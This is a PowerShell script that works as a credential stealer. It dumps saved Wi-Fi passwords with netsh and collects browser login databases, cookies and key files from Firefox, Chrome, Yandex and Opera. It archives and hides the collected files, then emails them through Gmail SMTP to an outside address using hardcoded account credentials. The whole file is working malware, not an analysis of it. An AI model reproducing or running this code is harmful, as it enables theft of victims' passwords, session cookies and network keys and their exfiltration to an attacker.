# (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ ESSID=$name;PASS=$pass }} | Format-Table -AutoSize > $env:TEMP\p.txt
echo "qwe"
$e=""
# $p=$env:TEMP+"\d"+(Get-Random -max 17071707)+".zip"
if(Test-Path "C:\Program Files\7-Zip\222227z.exe"){
  cd "C:\Program Files\7-Zip\"
  $arh="7"
}
elseif (Test-Path "C:\Program Files\WinRAR\RAR.exe"){
  cd "C:\Program Files\WinRAR\"
  $arh="W"
}
else{echo "asd"}
echo $arh

$lst = @{0=(($env:APPDATA+"\Mozilla\Firefox\Profiles\*"), "firefox", "logins.json","*.db", "");
        1=(($env:LOCALAPPDATA+"\Google\Chrome\User Data\"), "chrome", "Login Data", "Cookies", "Local State");
        2=(($env:LOCALAPPDATA+"\Yandex\YandexBrowser\User Data\Default\"), "browser", "Ya Passman Data", "Cookies", "");
        3=(($env:APPDATA+"\Opera Software\Opera Stable\"), "Opera123", "Login Data", "Cookies", "Local State");
        4=(($env:APPDATA+"\Opera Software\Opera GX Stable111111\"), "Opera5656", "Login Data", "Cookies", "Local State")}
###########
for ($i=0; $i -lt 5; $i++){
  $SMTPServer="smtp.gmail.com"
  $SMTPInfo=New-Object Net.Mail.SmtpClient($SmtpServer,587)
  $SMTPInfo.EnableSsl=$true
  $SMTPInfo.Credentials=New-Object System.Net.NetworkCredential("f7swwq@gmail.com","parampam1")
  $ReportEmail=New-Object System.Net.Mail.MailMessage
  $ReportEmail.From="f7swwq@gmail.com"
  $ReportEmail.To.Add("keklol2045@gmail.com")
  if(Test-Path $lst[$i][0]){
    echo '+++++++++', $arh, '+++++++++'
    echo ($lst[$i][0])
    $p=($env:TEMP+"\"+$lst[$i][1])
    #Stop-Process -Name $el[1] -ErrorAction SilentlyContinue;
    if($arh-eq "7"){
      $p=($p+".zip")
     .\7z.exe a $p (gci -Path $lst[$i][0] -Include $lst[$i][2], $lst[$i][3], $lst[$i][4] -Recurse) -put -spf -tzip
#      Invoke-Expression (".\7z.exe a $p{0} (Get-ChildItem -Path $lst[$i][0] -Include  $lst[$i][2], $lst[$i][3] -Recurse) -spf -tzip" -f $i)
     }
    elseif($arh-eq "W"){
    echo ($p+".zip")
      echo "_________________"
      $p=($p+".rar")
      .\RAR.exe a $p (gci -Path $lst[$i][0] -Include $lst[$i][2], $lst[$i][3], $lst[$i][4] -Recurse) -ep3 -hput #-inul
    }
    else{
      $p=($p+".zip")
      gci -Path $lst[$i][0] -Include $lst[$i][2], $lst[$i][3], $lst[$i][4] -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p
    }
    attrib +H $p
    echo ("____ "+$p)
    $ReportEmail.Subject=$lst[$i][1]
    
    $s=New-Object Net.Mail.Attachment($p)
    $ReportEmail.Attachments.Add($s)
    #echo "SEND!!!"
    $SMTPInfo.Send($ReportEmail)
#     $s.Dispose()
  echo '----------', $arh, '----------'
  }
  else{
    echo ($lst[$i][1]) #$e=$e+' '+$lst[$i][1]#     
  }
}

# echo "56565656565656565656565656"
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$n=$_.Matches.Groups[1].Value.Trim();$_} | %{(netsh wlan show profile name="$n" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$d=$_.Matches.Groups[1].Value.Trim();$_} | %{[PSCustomObject]@{E=$n;P=$d}} | Format-Table -AutoSize > $env:TEMP\w.txt
$w=$env:TEMP+'\w.txt'
# if("7"-in $arh)
#   {.\7z.exe a $p $w -spf -tzip;echo " wqwe221ewwe"}
# else
#   {Compress-Archive -Path $w -Update -CompressionLevel Fastest -DestinationPath $p}
# echo "dadasdasdasdasasd"
#######################
# exit
# $Zip="C:\Users\qwe\Desktop\ARH\22.zip"
# >> #[System.IO.Compression.ZipFile]::CreateFromDirectory("C:\Users\qwe\Desktop\ARH",$Zip)
# >>
# >>
# >> #ДОБАВЛЯЕМ В СОЗДАННЫЙ АРХИВ ФАЙЛ
# >> $file="C:\Users\qwe\Desktop\sdsdas.png"
# >> [System.IO.Compression.ZipArchive]$ZipFile = [System.IO.Compression.ZipFile]::Open($Zip, ([System.IO.Compression.ZipArchiveMode]::Update))
# >> [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($ZipFile, $file, (Split-Path $file -Leaf))
# >> $ZipFile.Dispose()
